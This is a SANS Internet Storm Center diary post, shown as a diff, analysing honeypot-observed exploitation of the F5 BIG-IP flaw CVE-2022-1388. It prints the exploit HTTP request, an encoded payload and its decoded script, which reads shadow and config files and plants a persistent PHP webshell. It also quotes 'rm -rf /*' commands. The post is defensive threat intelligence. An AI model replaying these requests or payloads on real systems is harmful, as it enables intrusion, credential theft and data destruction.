@@ -1,0 +1,104 @@
+From 0-Day to Mirai: 7 days of BIG-IP Exploits
+  
+Published: 2022-05-13
+Last Updated: 2022-05-13 14:54:31 UTC
+by Johannes Ullrich (Version: 1)
+0 comment(s)
+We all know vulnerabilities have a lifecycle. First, they start as closely held secrets, hopefully known to the company producing the vulnerable software. After becoming publically known, there is often a "mad dash" to a public exploit. During this phase, security companies often show their skills by hinting at privately developed exploits first until the exploit is publically known. Once a public exploit is available, the next race starts among adversaries to collect the largest possible market share of vulnerable devices. In this stage, some nation-states may attempt to expand their attack network, while at the same time, kids in basements and North Korea are looking for coin mining bots. Oddly enough, they often do not patch the vulnerability, and you end up with devices being exploited repeatedly. In the end, you have the crustaceans among the attackers picking apart the crumbs or looking for web shells dropped by others. Finally, Iran and Mirai try to see if anything is left for them.  
+
+We saw this in a compressed form with CVE-2022-1388, the F5 BIG-IP remote code execution vulnerability. The vulnerability was particular in several ways:
+
+Exploitation was trivial once the exploit became known and easily implemented using existing tools.
+An exploit was available very early. Too early for organizations to roll out the patch in an organized fashion.
+The vulnerable devices were valuable.
+There was a somewhat limited population of exposed and easily exploitable devices.
+We had this cycle play out over about four days:
+
+attacks per day exploiting CVE-2022-1388
+
+The first attack probing for "POST /mgmt/tm/util/bash" arrived on May 9th at 2:34 UTC:
+
+POST /mgmt/tm/util/bash HTTP/1.1
+Host: [redacted]
+User-Agent: python-requests/2.27.1
+Accept: */*
+Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local
+-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-Host
+Content-type: application/json
+Authorization: Basic YWRtaW46
+Content-Length: 46
+
+{"command": "run", "utilCmdArgs": "-c whoami"}
+
+The source IP 185.239.226.177 isn't known for prior attacks, which is interesting. It looks like a "normal" unconfigured Windows web server.
+
+Only about half an hour later, we did see the second attack, this time with a bit a more complex payload from 45.72.32.11:
+
+{"command": "run", "utilCmdArgs": "-c \\"echo CmVjaG8gIj09PT09IjsgCmNhdCAvZXRjL2hvc3RuYW1lOyAKZWNobyAiPT09PT0iOyAgCmNhdCAvZXRjL2hvc3RzOyAgCmVjaG8gIj09PT09IjsgIApjYXQgL2V0Yy9wYXNzd2Q7ICAKZWNobyAiPT09PT0iOyAgCmNhdCAvZXRjL3NoYWRvdzsgIAplY2hvICI9PT09PSI7ICAKY2F0IC9ldGMvcmVzb2x2LmNvbmY7ICAKZWNobyAiPT09PT0iOyAgCmY1bWt1IC1mIDsgIAplY2hvICI9PT09PSI7ICAgCmY1bWt1IC1LOyAgCmVjaG8gIj09PT09IjsgIApmNW1rdSAtWjsgIAplY2hvICI9PT09PSI7ICAKbW91bnQgLW8gIHJ3LHJlbW91bnQgL3VzcjsKdGFyIHpjZiAvdXNyL2xvY2FsL3d3dy94dWkvY29tbW9uL2Nzcy8yZjkyMzNkODQwNmMuY3NzIC9jb25maWcvKiAvcm9vdC8uYmFzaF9oaXN
+0b3J5OwplY2hvICI8P3BocCBAZXZhbChiYXNlNjRfZGVjb2RlKFwkX1BPU1RbJ2Y5MjMzZDg0MDYnXSkpOyIgPiAvdXNyL2xvY2FsL3d3dy94dWkvY29tbW9uL2Nzcy9mOTIzM2Q4NDA2Y3NzLnBocDsKZWNobyAiZWNobyBcIjw/cGhwIE
+BldmFsKGJhc2U2NF9kZWNvZGUoXFxcJF9QT1NUWydmOTIzM2Q4NDA2J10pKTtcIiA+IC91c3IvbG9jYWwvd3d3L3h1aS9jb21tb24vY3NzL2Y5MjMzZDg0MDZjc3MucGhwIiA+PiAvY29uZmlnL3N0YXJ0dXA7Cm1vdW50IC1vIHJvLHJlb
+W91bnQgL3VzcjsK|base64 -d > /tmp/f5.sh;/bin/bash /tmp/f5.sh;rm /tmp/f5.sh;\\""}
+
+The base64 encoded text decodes to a simple webshell:
+
+echo "====="; 
+cat /etc/hostname; 
+echo "=====";  
+cat /etc/hosts;  
+echo "=====";  
+cat /etc/passwd;  
+echo "=====";  
+cat /etc/shadow;  
+echo "=====";  
+cat /etc/resolv.conf;  
+echo "=====";  
+f5mku -f ;  
+echo "=====";   
+f5mku -K;  
+echo "=====";  
+f5mku -Z;  
+echo "=====";  
+mount -o  rw,remount /usr;
+tar zcf /usr/local/www/xui/common/css/2f9233d8406c.css /config/* /root/.bash_history;
+echo "<?php @eval(base64_decode(\$_POST['f9233d8406']));" > /usr/local/www/xui/common/css/f9233d8406css.php;
+echo "echo \"<?php @eval(base64_decode(\\\$_POST['f9233d8406']));\" > /usr/local/www/xui/common/css/f9233d8406css.php" >> /config/startup;
+mount -o ro,remount /usr;
+
+About 4 hours later, we do see attempts to use the webshell from 5 different IPs: 93.120.118.131, 178.159.74.190, 192.67.160.144, 216.74.110.226, and 64.43.114.53. Indicating that the same actor likely controls these IPs.
+
+It followed many more "id," "whoami," and similar commands to determine if our system was vulnerable, mixed in with a few webshells, backdoors, and the usual fare. Only very few attackers attempted to execute anything BIG-IP specific. We got only two or three attackers executing "tmsh" commands to extract users and password hashes. Overall, attackers plugged the exploit into existing tools and "let it go."
+
+One of the more interesting sequences of attacks came at 19:04 UTC on monday from 177.54.127.111:
+
+ls
+ls /etc/
+ls /run
+rm -rf /*
+rm -rf /*
+ls
+ls /run/
+ls /etc/
+
+The speed of this attack (it took about a minute from beginning to end) makes me believe that this was a manually executed attack. The attacker should have noticed that they were dealing with a honeypot but maybe wasn't sure or didn't understand the response, so they killed what they didn't understand with a swift "rm -rf /*."
+
+BIG-IP mounts the /usr partition read-only. This attack would have partially prevented the system from rebooting, but the BIG-IP software may have continued to work for a while.
+
+At least two more attempts were made to run "rm -rf" on our honeypots
+
+Overall, this was about it. "more of the usual." This morning, Brandon Prince, one of our sans.edu interns, reported seeing this malware uploaded to an ssh/telnet honeypot: 
+
+https://www.virustotal.com/gui/file/ccb5b33ad8ae136180aea84c0ef88e5e969039bd3cd6e1ba0b58e19e09a717aa/detection
+
+
+
+It is well detected as Mirai, and a simple string search shows the CVE-2022-1388 exploit present in the file among the usual payloads bots like Mirai are using these days:
+
+
+
+Final words (as Brad usually says):
+
+You can't survive from patching alone. A secure configuration will buy you enough time to apply patches. F5 has good guidance, and you should never expose admin interfaces to the internet on any device. At this point: Assume all vulnerable, exposed F5 BIG-IP devices have been exploited. Likely multiple times. Webshells have been installed. Do not just look for published IOCs, but look for all-new, unusual files and rebuild. A more sophisticated attacker may have used the BIG-IP device to target traffic passing through the device.
+
+---
+Johannes B. Ullrich, Ph.D. , Dean of Research, SANS.edu
+Twitter|
